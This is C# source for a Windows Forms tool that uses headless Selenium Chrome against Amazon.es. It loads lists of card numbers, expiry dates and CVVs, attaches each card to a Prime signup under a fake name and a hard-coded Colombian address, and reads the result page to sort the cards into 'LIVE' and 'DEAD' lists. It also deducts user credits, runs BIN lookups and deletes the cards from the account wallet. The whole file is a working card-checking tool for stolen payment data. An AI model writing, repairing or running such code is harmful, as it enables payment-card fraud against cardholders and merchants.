using Dominio;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Data;
using WMPLib;
using System.IO;
using Keys = OpenQA.Selenium.Keys;

namespace Presentacion
{
    public partial class amazon : Form
    {
        public amazon()
        {
            InitializeComponent();
        }
        IWebDriver driver;

        private void btniniciar_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void btnpausa_Click(object sender, EventArgs e)
        {
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Pausado";
            try
            {
                driver.Close();

            }
            catch
            {

            }
        }


        private object Tarjetas()
        {
            throw new NotImplementedException();
        }

        private void btncargar_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            try
            {
                // =========================================================
                char Separador;
                DataTable datagrid = new DataTable();
                DataRow dr;
                //==========================================================
                lblstatus.Text = "Cargadas correctamente!";
                lblstatus.ForeColor = Color.Gold;

                datagrid.Columns.Add("CC");
                datagrid.Columns.Add("MES");
                datagrid.Columns.Add("ANO");
                datagrid.Columns.Add("CVV");
                dr = datagrid.NewRow();
                //=============================================================
                System.IO.StreamReader Archivo = new System.IO.StreamReader(openFileDialog1.FileName);
                Separador = Convert.ToChar("|");
                while (Archivo.Peek() != -1)
                {
                    datagrid.Rows.Add(Archivo.ReadLine().Split(Separador));

                }
                dataGridView1.DataSource = datagrid;
                this.Tarjetas();
                dataGridView1.CurrentRow.Selected = true;
                // =============================================================
            }
            catch (Exception)
            {

            }
            this.tContador.Start();
            //ORGANIZADOR GRID
            int tmn;
            var loopTo = dataGridView1.ColumnCount - 1;
            for (tmn = 0; tmn <= loopTo - 1; tmn++)
            {
                if (tmn == dataGridView1.ColumnCount - 1)
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
                }
                else
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
                }

            }
            lblContador.Visible = true;
        }

        private void tContador_Tick(object sender, EventArgs e)
        {
            int suma = 0;
            try
            {
                var loopTo = dataGridView1.RowCount - 1;
                for (int i = 0; i <= loopTo; i++)
                {
                    if (Convert.ToBoolean(dataGridView1.Rows[i].Cells[1].ColumnIndex))
                    {
                        suma += 1;
                    }

                }

                this.lblContador.Text = Convert.ToString(suma);
            }
            catch (Exception)
            {
                lblContador.Text = "0";
            }

            if ((lblContador.Text == "1"))
            {
                lblContador.Text = "0";
                this.tContador.Stop();
                lblstatus.Text = "Finalizado!";
                lblstatus.ForeColor = Color.Red;

            }
        }

        private void btnlimpiar_Click(object sender, EventArgs e)
        {
            try
            {
                driver.Close();

            }
            catch
            {

            }
            dataGridView1.DataSource = null;
            dataGridView1.Rows.Clear();
            dataGridView1.Refresh();
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Cleaned";
            lives.Items.Clear();
            lblive.Text = "0";
            deads.Items.Clear();
            lbldead.Text = "0";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            vtnlogin.Visible = true;

        }

        private void button3_Click(object sender, EventArgs e)
        {
            String correo = email.Text;
            String contraseña = password.Text;
            if (String.IsNullOrEmpty(correo))
            {
                lblerror.Visible = true;
            }
            else if (String.IsNullOrEmpty(contraseña))
            {
                lblerror.Visible = true;
            }
            else
            {
                lblerror.Visible = false;
                vtnlogin.Visible = false;
                Thread t = new Thread(() => TareaSecundaria(lblstatus, deads, lives, dataGridView1, correo, contraseña));
                t.Start();
            }


        }

        void TareaSecundaria(object statusLabelObject, object deads, object lives, object DatagridView, String correo, String contraseña)
        {


            var statusLabel = statusLabelObject as Label;
            if (statusLabel == null)
                throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");


            try
            {


                if (lblContador.Text == "0")
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else if (lblContador.Text == "1")
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else if (Int32.Parse(lblContador.Text) > 300)
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"Demaciadas ccs!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else if (Int32.Parse(cache.creditos) < 5)
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else
                {
                    bool continu = true;
                    try
                    {
                        try
                        {

                            driver.Close();
                        }
                        catch
                        {

                        }
                        primer();
                        driver.FindElement(By.XPath("//*[@id='navBackToTop']/div/span"));
                        BeginInvoke((Action)(() => statusLabel.Text = @"Se inicio sesión!"));
                        BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Green));

                    }
                    catch (IOException e)
                    {
                        
                        
                        BeginInvoke((Action)(() => statusLabel.Text = "Error al iniciar"));
                        BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                        continu = false;
                    }

                    while (continu)
                    {
                        if (lblContador.Text == "0")
                        {
                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            continu = false;
                        }
                        else if (lblContador.Text == "1")
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            continu = false;
                        }
                        else if (Int32.Parse(cache.creditos) < 5)
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            continu = false;
                        }
                        else
                        {
                            try { 
                            comprandoprime();
                            proceso();
                            validar();
                            eliminar();
                            eliminarx2();
                            }
                            catch
                            {
                              /*  BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO"));
                                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                                continu = false;
                                try
                                {

                                    driver.Close();
                                }
                                catch
                                {

                                }*/
                            }
                        }

                    }
                }
            }
            catch
            {

                BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                try
                {

                    driver.Quit();
                }
                catch
                {

                }

            }



            void primer()
            {


              /*  try
                {
                    Thread.Sleep(3000);
                    TextWriter erlog = new StreamWriter("errorlog.txt");
                    erlog.WriteLine("prueba");
                    erlog.Close();
                }
                catch (Exception ex)
                {

                    string error = ex.Message;
                     BeginInvoke((Action)(() => statusLabel.Text = error));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    Thread.Sleep(5000);
                }*/

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Iniciando (1/5)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));


                string path = Directory.GetCurrentDirectory();
                ChromeDriverService service = ChromeDriverService.CreateDefaultService(path, "chromedriver2.exe");
                service.HideCommandPromptWindow = true;
                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--headless");
                options.AddArgument("no-sandbox");
                options.AddArgument("--disable-extensions");
                options.AddArgument("--disable-gpu");
                options.AddArgument("--disable-dev-shm-usage");
                options.AddArgument("--no-sandbox");
                options.AddArgument("--ignore-certificate-errors");
                options.AddArgument("--incognito");
                options.AddArgument("window-size=1200,1200");
                // options.AddArgument("--start-maximized");

                driver = new ChromeDriver(service, options);

                BeginInvoke((Action)(() => statusLabel.Text = @"datos cargados "));
                Thread.Sleep(3000);
                driver.Navigate().GoToUrl("https://www.amazon.es/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.es%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=esflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
                Thread.Sleep(3000);
                driver.FindElement(By.XPath("//*[@id='ap_email']")).SendKeys(correo);
                driver.FindElement(By.XPath("//*[@id='continue']")).Click();
                driver.FindElement(By.XPath("//*[@id='ap_password']")).SendKeys(contraseña);
                driver.FindElement(By.XPath("//*[@id='signInSubmit']")).Click();
                if (driver.PageSource.Contains("Añadir número de teléfono móvil"))
                {
                    driver.FindElement(By.XPath("//*[@id='ap-account-fixup-phone-skip-link']")).Click();
                }


            }

            void comprandoprime()
            {
                BeginInvoke((Action)(() => statusLabel.Text = @"Comprando prime"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                try
                {
                    IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                Thread.Sleep(2000);
                driver.Navigate().GoToUrl("https://www.amazon.es/hp/wlp/pipeline/membersignup?redirectURL=L2dwL3ByaW1l&ms3_c=63749bed4618d01dde5606db2e5a90f2&locationID=prime_confirm&primeCampaignId=SlashPrime&offerToken=p9mbPhgcsUzpHdYlp7ffuPYy_9_qcvZfMPqAFxIXcvmNB1dvmFF7X63lPhSXDn7TdZ0QIFGamIje_6oaXMjMAbKNTrHiu6_H8BWlt_5VjxAHXpkGp6Ljd6dt-Y-VW_GSqbvYBRvXVse-HwWUQStfCiKsMZmrVvPCJY04AAziGsWf629mlK7VO25ejrxQFMsNjxmzstRqIjaWWkHHxrhHONDBj6FtcWYI6q2nur-2DV-2KTTGKdnFyiYeyIpnpBOJ3_7_McCR7hEK7BhKbi-Uy-O2FRUVWbY-FVeRi3JLXvnYoG3ENH5jC7tbVGFxvTT45dXNauPlaBXAHwzsjDlLkxV11T9p7McQxJrW_wNBCGDHYY2cGAeUm4dWmDoy85sxfj0bnFq62wFThr7-5AgdJ5rfUZXWfwFYPXHTQdqnIlHDXokLxvjNagyKH0RY-5N9XO791Ey6pYLtRHP1demmE7FHHj3AQAWirVRF8DtEvw7krhse4S9Ds9gRjQ_dhT0FuWx8UV-OFF1jFxHd97_ZLEylCd9IFLTGR7B5mbE1lapb-0CKmoMHDIJU-6_L2Pod3BirVQ1yNjHqDRvLl9By27a1Dfy42Aqb0VBTw-bnr_XFUxmCQhZiHSOEvuekBUmZrylszbndfaAUT8_GxBiGu56z5AUr75OQJ7z7MnYqWgxCAlKEq2naIvs-URxsDq73Po7Q-bizCrmsD9ofkA&cancelRedirectURL=Lw&openid.assoc_handle=amzn_wlpmember_es&openid.claimed_id=https%3A%2F%2Fwww.amazon.es%2Fap%2Fid%2Famzn1.account.GHJ7KDVX3YRERTQKWRIYSIDEFY&openid.identity=https%3A%2F%2Fwww.amazon.es%2Fap%2Fid%2Famzn1.account.GHJ7KDVX3YRERTQKWRIYSIDEFY&openid.mode=id_res&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.op_endpoint=https%3A%2F%2Fwww.amazon.es%2Fap%2Fsignin&openid.response_nonce=2021-03-23T21%3A40%3A55Z-1883378126351374435&openid.return_to=https%3A%2F%2Fwww.amazon.es%2Fhp%2Fwlp%2Fpipeline%2Fmembersignup%3FredirectURL%3DL2dwL3ByaW1l%26ms3_c%3D63749bed4618d01dde5606db2e5a90f2%26locationID%3Dprime_confirm%26primeCampaignId%3DSlashPrime%26offerToken%3Dp9mbPhgcsUzpHdYlp7ffuPYy_9_qcvZfMPqAFxIXcvmNB1dvmFF7X63lPhSXDn7TdZ0QIFGamIje_6oaXMjMAbKNTrHiu6_H8BWlt_5VjxAHXpkGp6Ljd6dt-Y-VW_GSqbvYBRvXVse-HwWUQStfCiKsMZmrVvPCJY04AAziGsWf629mlK7VO25ejrxQFMsNjxmzstRqIjaWWkHHxrhHONDBj6FtcWYI6q2nur-2DV-2KTTGKdnFyiYeyIpnpBOJ3_7_McCR7hEK7BhKbi-Uy-O2FRUVWbY-FVeRi3JLXvnYoG3ENH5jC7tbVGFxvTT45dXNauPlaBXAHwzsjDlLkxV11T9p7McQxJrW_wNBCGDHYY2cGAeUm4dWmDoy85sxfj0bnFq62wFThr7-5AgdJ5rfUZXWfwFYPXHTQdqnIlHDXokLxvjNagyKH0RY-5N9XO791Ey6pYLtRHP1demmE7FHHj3AQAWirVRF8DtEvw7krhse4S9Ds9gRjQ_dhT0FuWx8UV-OFF1jFxHd97_ZLEylCd9IFLTGR7B5mbE1lapb-0CKmoMHDIJU-6_L2Pod3BirVQ1yNjHqDRvLl9By27a1Dfy42Aqb0VBTw-bnr_XFUxmCQhZiHSOEvuekBUmZrylszbndfaAUT8_GxBiGu56z5AUr75OQJ7z7MnYqWgxCAlKEq2naIvs-URxsDq73Po7Q-bizCrmsD9ofkA%26cancelRedirectURL%3DLw&openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2CsiteState%2Cns.pape%2Cpape.auth_policies%2Cpape.auth_time%2Ccaptcha_verified%2Cclaim_type%2Cnew_account%2Csigned&siteState=clientContext%3D262-9213571-6869751%2CsourceUrl%3Dhttps%253A%252F%252Fwww.amazon.es%252Fhp%252Fwlp%252Fpipeline%252Fmembersignup%253FredirectURL%253DL2dwL3ByaW1l%2526ms3_c%253D63749bed4618d01dde5606db2e5a90f2%2526locationID%253Dprime_confirm%2526primeCampaignId%253DSlashPrime%2526offerToken%253Dp9mbPhgcsUzpHdYlp7ffuPYy_9_qcvZfMPqAFxIXcvmNB1dvmFF7X63lPhSXDn7TdZ0QIFGamIje_6oaXMjMAbKNTrHiu6_H8BWlt_5VjxAHXpkGp6Ljd6dt-Y-VW_GSqbvYBRvXVse-HwWUQStfCiKsMZmrVvPCJY04AAziGsWf629mlK7VO25ejrxQFMsNjxmzstRqIjaWWkHHxrhHONDBj6FtcWYI6q2nur-2DV-2KTTGKdnFyiYeyIpnpBOJ3_7_McCR7hEK7BhKbi-Uy-O2FRUVWbY-FVeRi3JLXvnYoG3ENH5jC7tbVGFxvTT45dXNauPlaBXAHwzsjDlLkxV11T9p7McQxJrW_wNBCGDHYY2cGAeUm4dWmDoy85sxfj0bnFq62wFThr7-5AgdJ5rfUZXWfwFYPXHTQdqnIlHDXokLxvjNagyKH0RY-5N9XO791Ey6pYLtRHP1demmE7FHHj3AQAWirVRF8DtEvw7krhse4S9Ds9gRjQ_dhT0FuWx8UV-OFF1jFxHd97_ZLEylCd9IFLTGR7B5mbE1lapb-0CKmoMHDIJU-6_L2Pod3BirVQ1yNjHqDRvLl9By27a1Dfy42Aqb0VBTw-bnr_XFUxmCQhZiHSOEvuekBUmZrylszbndfaAUT8_GxBiGu56z5AUr75OQJ7z7MnYqWgxCAlKEq2naIvs-URxsDq73Po7Q-bizCrmsD9ofkA%2526cancelRedirectURL%253DLw%2Csignature%3Dnull&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.auth_policies=http%3A%2F%2Fschemas.openid.net%2Fpape%2Fpolicies%2F2007%2F06%2Fnone&openid.pape.auth_time=2021-03-23T21%3A40%3A55Z&captcha_verified=1&claim_type=EmailAddress&new_account=1&");
                Thread.Sleep(3000);

                    try
                    {
                        // driver.FindElement(By.Id("prime-header-CTA")).Click();
                      //  Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/form/div/div/div/div[1]/div[2]/div[1]/span[4]/input")).Click();
                    Thread.Sleep(3000);///html/body/div[1]/div[2]/div/div[3]/div[2]/div[2]/div[4]/div/div/div[1]/div/div[2]/div/div/span/a
                    driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[4]/div/div/div[1]/div/div[2]/div/div/span/a")).Click();
                    Thread.Sleep(2000);
                    }
                    catch (IOException e)
                    {
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[4]/div/div/div[1]/div/div[2]/div/div/span/a")).Click();
                        Thread.Sleep(2000);
                    }
                }
                catch (IOException e)
                {

                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzEs/ComprandoPrime");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close();
                    

                }
                Thread.Sleep(2000);

            }
            void seleccionar()
            {
                Thread.Sleep(3000);

                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                try
                {
                    Thread.Sleep(3000);
                    BeginInvoke((Action)(() => statusLabel.Text = @"Seleccionando la cc"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));

                    /* string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                     String cculti;
                     if (cc.Length == 16)
                     {
                         int startIndex = 12;
                         int length = 4;
                         cculti = cc.Substring(startIndex, length);

                     }
                     else
                     {
                         int startIndex = 11;
                         int length = 4;
                         cculti = cc.Substring(startIndex, length);

                     }
                     int variable = 1;
                     bool cambio = false;
                     Thread.Sleep(3000);
                     while (cambio == false)
                     {

                         String vari = variable.ToString();
                         WebElement cambiar = (WebElement)driver.FindElement(By.XPath("//*[@id='a-page']/div/div[4]/div[3]/div[2]/div[3]/form/div[1]/div/div/div[1]/div[3]/div[" + vari + "]/div/div/div/div/div[2]/div[1]/div[1]/div/div/div[2]/div/div/span/span/span[3]"));
                         if (cambiar.Text == "que termina en " + cculti)
                         {
                             IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                             js.ExecuteScript("arguments[0].scrollIntoView();", cambiar);
                             js.ExecuteScript("arguments[0].click();", cambiar);
                             cambio = true;
                         }
                         else
                         {
                             variable++;
                         }
                     }*/

                   try{
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[1]/div/div/div[1]/div[3]/div/div/div/div/div/div[1]/span/div/label/input")).Click();
                        Thread.Sleep(2000);
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[2]/div/div/div/span/span/input")).Click();
                    }
                    catch {
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[1]/div/div/div[1]/div[3]/div[1]/div/div/div/div/div[1]/span/div/label/input")).Click();
                        Thread.Sleep(2000);
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[2]/div/div/div/span/span/input")).Click();
                    }
                }
                catch (IOException e)
                {
                    Thread.Sleep(3000);
                    
                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzEs/Seleccionando");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close();
                }




                
            }

            void validar()
            {

                var statusLabel = statusLabelObject as Label;
                var livess = lives as ListBox;
                var deadss = deads as ListBox;
                var dataGridView1 = DatagridView as DataGridView;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");
                BeginInvoke((Action)(() => statusLabel.Text = @"Validando"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));

                Thread.Sleep(2000);

                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();

                if (driver.PageSource.Contains("Ha ocurrido un error durante la validación de tu método de pago. Por favor, actualízalo o añade un nuevo método de pago e inténtalo nuevamente."))
                {
                    BeginInvoke((Action)(() => deadss.Items.Add("✘ DEAD [GATE - UCRANIA] - " + cc + " | " + month + " | " + year + " | " + cvv + " - [Golpe De Estado]")));
                    BeginInvoke((Action)(() => statusLabel.Text = @"✘ DEAD ✘"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                }
                else if(driver.PageSource.Contains("Tu suscripción a Amazon Prime no ha empezado. Por favor, inténtalo de nuevo o cambia tu método de pago. Si el problema continúa, contacta con tu banco."))
                {
                    BeginInvoke((Action)(() => deadss.Items.Add("✘ DEAD [GATE - UCRANIA] - " + cc + " | " + month + " | " + year + " | " + cvv + " - [Golpe De Estado]")));
                    BeginInvoke((Action)(() => statusLabel.Text = @"✘ DEAD ✘"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                }
                else if (driver.PageSource.Contains("Lo sentimos, solo los clientes con una dirección de facturación en España pueden suscribirse a Amazon Prime en Amazon.es."))
                {
                    datos delete = new datos();
                    var eliminar = delete.Discount(cache.user);
                    cache.creditos = eliminar;
                    //eliminar = creditos.Text;
                    WindowsMediaPlayer musica;
                    musica = new WindowsMediaPlayer();
                    musica.URL = Application.StartupPath + @"\driver\live.mp3";
                    musica.controls.play();
                    BeginInvoke((Action)(() => statusLabel.Text = @"✔ LIVE ✔"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Green));
                    datos bin = new datos();
                    string tarjt = cc + "|" + month + "|" + year + "|" + cvv;
                    var binlookup = delete.bin(cache.user, tarjt, "UCRANIA");

                    BeginInvoke((Action)(() => livess.Items.Add("✔ LIVE [GATE - UCRANIA] - " + cc + " | " + month + " | " + year + " | " + cvv + "✔ - [Golpe De Estado] - [" + binlookup + "]")));

                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                    BeginInvoke((Action)(() => statusLabel.Text = @eliminar));
                }
                else
                {
                    validar();
                }
            }

            void pagar()
            {
                driver.FindElement(By.XPath("//*[@id='wlp-join-prime-button-announce']")).Click();

            }

            void direccion()
            {
                Thread.Sleep(3000);
                try
                {
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div/div/div/span[2]/span/input")).Click();
                    Thread.Sleep(2000);
                }
                catch
                {
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div[1]/div[2]/div[2]/input")).SendKeys("Cl. 33a Sur #73f 08");
                    driver.FindElement(By.XPath("//*[@id='city']/input")).SendKeys("Bogota");
                    driver.FindElement(By.XPath("//*[@id='stateOrRegion']/input")).SendKeys("Cundinamarca");
                    driver.FindElement(By.XPath("//*[@id='postalCode']/input")).SendKeys("110821");

                    var pais = new SelectElement(driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div[1]/div[2]/div[7]/span/select")));
                    pais.SelectByText("Colombia");

                    driver.FindElement(By.XPath("//*[@id='phoneNumber']/input")).SendKeys("3213765542");

                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div[2]/div/span/span/input")).Click();

                }
            }

            void proceso()
            {
                BeginInvoke((Action)(() => statusLabel.Text = @"Agregando cc"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                Thread.Sleep(2000);
                try { 
                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();
                String iframe;

                driver.SwitchTo().Frame(driver.FindElement(By.ClassName("apx-inline-secure-iframe")));
                driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/div/form/div[3]/div[1]/input")).SendKeys("Juan Chupeste");
                driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/div/form/div[3]/div[2]/div/input")).SendKeys(cc);
                var mesexp = driver.FindElement(By.XPath("//*[@id='add-credit-card-expiry-date-input-id']/span[1]/select"));
                var selectElement = new SelectElement(mesexp);
                selectElement.SelectByText(month);
                var añoexp = driver.FindElement(By.XPath("//*[@id='add-credit-card-expiry-date-input-id']/span[3]/select"));
                var selectElement2 = new SelectElement(añoexp);
                selectElement2.SelectByText(year);
                Thread.Sleep(4000);
                WebElement añadir = (WebElement)driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/div/form/div[3]/div[5]/span/span/input"));
                IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                js.ExecuteScript("arguments[0].scrollIntoView();", añadir);
                js.ExecuteScript("arguments[0].click();", añadir);
                Thread.Sleep(2000);
                direccion();
                driver.SwitchTo().DefaultContent();
                Thread.Sleep(2000);
                seleccionar();
                Thread.Sleep(3000);
                pagar();
                Thread.Sleep(5000);
                }
                catch (IOException e)
                {
                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzEs/Proceso");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close(); 
                   
                }
            }


            void ingresar()
            {
                Thread.Sleep(2000);
                if (driver.PageSource.Contains("Contraseña"))
                {
                    driver.FindElement(By.XPath("//*[@id='ap_password']")).SendKeys(contraseña);
                    driver.FindElement(By.XPath("//*[@id='signInSubmit']")).Click();
                    Thread.Sleep(2000);
                    if (driver.PageSource.Contains("Añadir número de teléfono móvil"))
                    {
                        driver.FindElement(By.XPath("//*[@id='ap-account-fixup-phone-skip-link']")).Click();

                    }
                    driver.Navigate().GoToUrl("https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
                }


            }

            void eliminar()
            {


                BeginInvoke((Action)(() => statusLabel.Text = @"Eliminando ccs"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                driver.Navigate().GoToUrl("https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
                ingresar();
                try
                {
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div[3]/div/div[2]/div/div/div/div/div[2]/div[3]/div/div[1]/div/a"));
                    eliminarr();
                }
                catch
                {
                    Thread.Sleep(2000);
                }
            }
            void eliminarr()
            {
                IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                Thread.Sleep(2000);
                WebElement editar = (WebElement)driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div[3]/div/div[2]/div/div/div/div/div[2]/div[3]/div/div[1]/div/a"));
                js.ExecuteScript("arguments[0].click();", editar);
                Thread.Sleep(2000);
                WebElement eliminar = (WebElement)driver.FindElement(By.XPath("//*[@id='a-popover-content-1']/div/form[2]/div[3]/div[1]/span/input"));
                js.ExecuteScript("arguments[0].click();", eliminar);
                Thread.Sleep(2000);
                WebElement confirmar = (WebElement)driver.FindElement(By.XPath("//*[@id='a-popover-content-2']/div/div[3]/div/span[1]/span/input"));
                js.ExecuteScript("arguments[0].click();", confirmar);
                eliminarr();
            }

            void eliminarx2()
            {


                BeginInvoke((Action)(() => statusLabel.Text = @"Eliminando ccs"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                driver.Navigate().GoToUrl("https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
                ingresar();
                try
                {
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div[3]/div/div[2]/div/div/div/div/div[2]/div[3]/div/div[1]/div/a"));
                    eliminarr();
                }
                catch
                {
                    Thread.Sleep(2000);
                }
            }
        }

        private void lives_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control == true && e.KeyCode == System.Windows.Forms.Keys.C)
            {
                string s = lives.SelectedItem.ToString();
                Clipboard.SetData(DataFormats.StringFormat, s);
            }
        }


    }
}
